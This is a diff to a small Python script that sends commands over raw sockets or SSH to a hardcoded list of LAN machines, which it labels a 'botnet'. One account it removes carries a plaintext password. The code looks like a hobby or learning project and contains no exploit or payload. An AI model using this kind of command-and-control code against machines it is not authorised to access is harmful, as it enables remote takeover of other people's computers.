@@ -5,10 +5,8 @@ import socket
 def sendCommand(HOST, PORT, COMMAND):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
-    s.sendall(COMMAND)
-    data = s.recv(2)
-    s.close()
-    return data.decode("uts-8")
+    s.sendall(bytes(COMMAND, "utf-8"))
+
 
 def commandSHH(Host, port, username, password, command):
     ssh = paramiko.SSHClient()
@@ -56,9 +54,9 @@ class bot:
                 if sendCommand(host, port, "cd"):
                     self.host = host
                     self.port = port
-                    self.type = 1
+                    self.ssh = 1
         except Exception as e:
-            print("Error:", e)
+            print("Error with ip: {}, ".format(host), e)
     def botnetCommand(self, command):
         try:
             if self.ssh:
@@ -67,10 +65,15 @@ class bot:
                     print(commandSHH(self.host, self.port, self.user, self.passwd, command)) 
                 else:
                     print("No output from:", self.host)
+            else:
+                sendCommand(self.host, self.port, command)
         except Exception as e:
-            print(e)
-jamollenkamp = bot("192.168.1.106", "jamollenkamp", "iyy7y9y9", 22)
-botnet = [jamollenkamp]
+            try:
+                print("Error with ip: {}, ".format(self.host), e)
+            except:
+                print("There was an error while error handling...")
+memollenkamp = bot("192.168.1.11", "memol", "", False, 50007)
+botnet = [memollenkamp]
 
 def commandBotnet(command):
     for computer in botnet:
